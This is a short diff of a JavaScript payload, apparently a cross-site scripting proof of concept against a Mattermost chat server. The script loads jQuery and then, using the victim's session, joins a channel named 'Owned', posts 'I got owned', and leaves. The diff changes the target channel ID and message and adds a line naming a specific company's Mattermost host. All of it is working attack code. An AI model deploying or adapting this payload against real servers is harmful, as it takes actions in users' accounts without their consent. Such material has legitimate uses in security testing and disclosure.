@@ -11,19 +11,21 @@ document.head.appendChild(jquery);
 
 // Next, lets add ourselves to the channel "Owned"
 // POST /api/v1/channels/hash/join
-$.post('/api/v1/channels/u85yooqb4jrq7ct1pmsooc4j3h/join', function(data, status){
+https://mattermost.cigital.com/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/extra_info
+
+$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/join', function(data, status){
 	// lets say we were owned in this channel
 	var data = {
 		"filenames": [],
-		"message": "A",
-		"channel_id": "u85yooqb4jrq7ct1pmsooc4j3h",
+		"message": "I got owned",
+		"channel_id": "gtichcgad3b4idix8tdsgdr5qh",
 		"pending_post_id": "",
 		"user_id": "",
 		"create_at":1,
 		"state":"loading"
 	};
-	$.post('/api/v1/channels/u85yooqb4jrq7ct1pmsooc4j3h/create', JSON.stringify(data), function(retData,status){
-		$.post('/api/v1/channels/u85yooqb4jrq7ct1pmsooc4j3h/leave', function(data, status){
+	$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){
+		$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
 		});
 	});
 })
